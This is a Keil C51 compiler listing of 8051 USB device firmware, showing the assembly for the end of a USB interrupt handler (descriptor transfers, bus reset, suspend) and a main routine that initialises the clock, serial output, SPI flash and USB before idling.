03D4 E0                MOVX    A,@DPTR
03D5 24FB              ADD     A,#0FBH
03D7 6060              JZ      ?C0319
03D9 14                DEC     A
03DA 706B              JNZ     ?C0320
                                           ; SOURCE LINE # 1436
                                           ; SOURCE LINE # 1437
03DC         ?C0316:
                                           ; SOURCE LINE # 1438
03DC 900000      R     MOV     DPTR,#SetupLen
03DF E0                MOVX    A,@DPTR
03E0 FF                MOV     R7,A
03E1 C3                CLR     C
03E2 9408              SUBB    A,#08H
03E4 7480              MOV     A,#080H
03E6 9480              SUBB    A,#080H
03E8 4007              JC      ?C0317
03EA 7E08              MOV     R6,#08H
03EC CF                XCH     A,R7
03ED EE                MOV     A,R6
03EE CF                XCH     A,R7
03EF 8000              SJMP    ?C0318
03F1         ?C0317:
03F1         ?C0318:
03F1 900000      R     MOV     DPTR,#len
03F4 EF                MOV     A,R7
03F5 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1439
03F6 7E00              MOV     R6,#00H
03F8 C8                XCH     A,R0
03F9 7400        R     MOV     A,#LOW Ep0Buffer
03FB C8                XCH     A,R0
03FC CC                XCH     A,R4
03FD 7400        R     MOV     A,#HIGH Ep0Buffer
03FF CC                XCH     A,R4
0400 CD                XCH     A,R5
0401 7401              MOV     A,#01H
0403 CD                XCH     A,R5
0404 900000      R     MOV     DPTR,#pDescr
0407 E0                MOVX    A,@DPTR
0408 FB                MOV     R3,A
0409 A3                INC     DPTR
040A E0                MOVX    A,@DPTR
040B FA                MOV     R2,A
040C A3                INC     DPTR
040D E0                MOVX    A,@DPTR
040E F9                MOV     R1,A
040F 120000      E     LCALL   ?C?COPY
                                           ; SOURCE LINE # 1440
0412 900000      R     MOV     DPTR,#SetupLen
0415 E0                MOVX    A,@DPTR
0416 FF                MOV     R7,A
0417 900000      R     MOV     DPTR,#len
041A E0                MOVX    A,@DPTR
041B FE                MOV     R6,A
041C C3                CLR     C
041D EF                MOV     A,R7
041E 9E                SUBB    A,R6
041F 900000      R     MOV     DPTR,#SetupLen
0422 F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1441
0423 EE                MOV     A,R6
0424 FF                MOV     R7,A
0425 900000      R     MOV     DPTR,#pDescr+01H
0428 E4                CLR     A
0429 8FF0              MOV     B,R7
042B 120000      E     LCALL   ?C?IILDX
                                           ; SOURCE LINE # 1442
042E 900000      R     MOV     DPTR,#len
0431 E0                MOVX    A,@DPTR
0432 F5DD              MOV     UEP0_T_LEN,A
                                           ; SOURCE LINE # 1443
0434 63DC40            XRL     UEP0_CTRL,#040H
                                           ; SOURCE LINE # 1444
0437 801C              SJMP    ?C0240
                                           ; SOURCE LINE # 1445
0439         ?C0319:
                                           ; SOURCE LINE # 1446
0439 E5E3              MOV     A,USB_DEV_AD
043B 5480              ANL     A,#080H
043D FF                MOV     R7,A
043E 900000      R     MOV     DPTR,#SetupLen
0441 E0                MOVX    A,@DPTR
0442 4F                ORL     A,R7
0443 F5E3              MOV     USB_DEV_AD,A
                                           ; SOURCE LINE # 1447
                                           ; SOURCE LINE # 1448
0445 8003              SJMP    ?C0400
                                           ; SOURCE LINE # 1449
0447         ?C0320:
                                           ; SOURCE LINE # 1450
0447 75DD00            MOV     UEP0_T_LEN,#00H
                                           ; SOURCE LINE # 1451
044A         ?C0400:
044A 75DC02            MOV     UEP0_CTRL,#02H
                                           ; SOURCE LINE # 1452
044D 8006              SJMP    ?C0240
                                           ; SOURCE LINE # 1453
                                           ; SOURCE LINE # 1454
                                           ; SOURCE LINE # 1455
                                           ; SOURCE LINE # 1456
044F         ?C0321:
                                           ; SOURCE LINE # 1457
                                           ; SOURCE LINE # 1458
044F 75DD00            MOV     UEP0_T_LEN,#00H
                                           ; SOURCE LINE # 1459
0452 63DC80            XRL     UEP0_CTRL,#080H
                                           ; SOURCE LINE # 1460
                                           ; SOURCE LINE # 1461
                                           ; SOURCE LINE # 1462
                                           ; SOURCE LINE # 1463
                                           ; SOURCE LINE # 1464
0455         ?C0240:
                                           ; SOURCE LINE # 1465
0455 C2D9              CLR     UIF_TRANSFER
                                           ; SOURCE LINE # 1466
0457 8043              SJMP    ?C0330
0459         ?C0239:
                                           ; SOURCE LINE # 1467
0459 30D822            JNB     UIF_BUS_RST,?C0324
                                           ; SOURCE LINE # 1468
                                           ; SOURCE LINE # 1469
045C 7BFF              MOV     R3,#0FFH
045E 7A00        R     MOV     R2,#HIGH ?SC_60
0460 7900        R     MOV     R1,#LOW ?SC_60
0462 120000      E     LCALL   _printf
                                           ; SOURCE LINE # 1470
0465 75DC02            MOV     UEP0_CTRL,#02H
                                           ; SOURCE LINE # 1471
0468 75D212            MOV     UEP1_CTRL,#012H
                                           ; SOURCE LINE # 1472
046B 75D412            MOV     UEP2_CTRL,#012H
                                           ; SOURCE LINE # 1473
046E 75E300            MOV     USB_DEV_AD,#00H
                                           ; SOURCE LINE # 1474
0471 C2DA              CLR     UIF_SUSPEND
                                           ; SOURCE LINE # 1475
0473 C2D9              CLR     UIF_TRANSFER
                                           ; SOURCE LINE # 1476
0475 C2D8              CLR     UIF_BUS_RST
                                           ; SOURCE LINE # 1477
0477 900000      R     MOV     DPTR,#UsbReady
047A E4                CLR     A
047B F0                MOVX    @DPTR,A
                                           ; SOURCE LINE # 1478
047C 801E              SJMP    ?C0330
047E         ?C0324:
                                           ; SOURCE LINE # 1479
047E 30DA18            JNB     UIF_SUSPEND,?C0326
                                           ; SOURCE LINE # 1480
                                           ; SOURCE LINE # 1481
0481 C2DA              CLR     UIF_SUSPEND
                                           ; SOURCE LINE # 1482
0483 E5DA              MOV     A,USB_MIS_ST
0485 7BFF              MOV     R3,#0FFH
0487 30E206            JNB     ACC.2,?C0327
                                           ; SOURCE LINE # 1483
                                           ; SOURCE LINE # 1484
048A 7A00        R     MOV     R2,#HIGH ?SC_67
048C 7900        R     MOV     R1,#LOW ?SC_67
                                           ; SOURCE LINE # 1485
048E 8004              SJMP    ?C0401
0490         ?C0327:
                                           ; SOURCE LINE # 1487
                                           ; SOURCE LINE # 1488
0490 7A00        R     MOV     R2,#HIGH ?SC_76
0492 7900        R     MOV     R1,#LOW ?SC_76
0494         ?C0401:
0494 120000      E     LCALL   _printf
                                           ; SOURCE LINE # 1489
                                           ; SOURCE LINE # 1490
0497 8003              SJMP    ?C0330
0499         ?C0326:
                                           ; SOURCE LINE # 1492
                                           ; SOURCE LINE # 1494
0499 75D8FF            MOV     USB_INT_FG,#0FFH
                                           ; SOURCE LINE # 1495
                                           ; SOURCE LINE # 1496
049C         ?C0330:
049C D0D0              POP     PSW
049E D082              POP     DPL
04A0 D083              POP     DPH
04A2 D0F0              POP     B
04A4 D0E0              POP     ACC
04A6 32                RETI    
             ; FUNCTION USB_DeviceInterrupt (END)

             ; FUNCTION main (BEGIN)
                                           ; SOURCE LINE # 1499
                                           ; SOURCE LINE # 1500
                                           ; SOURCE LINE # 1501
0000 120000      E     LCALL   CfgFsys
                                           ; SOURCE LINE # 1502
0003 7F64              MOV     R7,#064H
0005 7E00              MOV     R6,#00H
0007 120000      E     LCALL   _mDelaymS
                                           ; SOURCE LINE # 1503
000A 120000      E     LCALL   mInitSTDIO
                                           ; SOURCE LINE # 1505
000D 120000      R     LCALL   InitHostSPI0
                                           ; SOURCE LINE # 1506
0010 120000      R     LCALL   WriteFlashEnable
                                           ; SOURCE LINE # 1507
0013 E4                CLR     A
0014 FF                MOV     R7,A
0015 120000      R     LCALL   _WriteFlashStatus
                                           ; SOURCE LINE # 1509
0018 120000      R     LCALL   InitUSB_Device
001B         ?C0331:
                                           ; SOURCE LINE # 1510
001B 900000      R     MOV     DPTR,#UsbReady
001E E0                MOVX    A,@DPTR
001F 60FA              JZ      ?C0331
0021         ?C0333:
                                           ; SOURCE LINE # 1518
                                           ; SOURCE LINE # 1519
                                           ; SOURCE LINE # 1525
0021 7F64              MOV     R7,#064H
0023 7E00              MOV     R6,#00H
0025 120000      E     LCALL   _mDelaymS
                                           ; SOURCE LINE # 1526
0028 80F7              SJMP    ?C0333
             ; FUNCTION main (END)



MODULE INFORMATION:   STATIC OVERLAYABLE
   CODE SIZE        =   4918    ----
   CONSTANT SIZE    =    388    ----
   XDATA SIZE       =     35      69
   PDATA SIZE       =   ----    ----
   DATA SIZE        =   ----    ----
   IDATA SIZE       =    128    ----
   BIT SIZE         =      6    ----
   EDATA SIZE       =   ----    ----
   HDATA SIZE       =   ----    ----
   XDATA CONST SIZE =   ----    ----
   FAR CONST SIZE   =   ----    ----
END OF MODULE INFORMATION.


C51 COMPILATION COMPLETE.  0 WARNING(S),  0 ERROR(S)
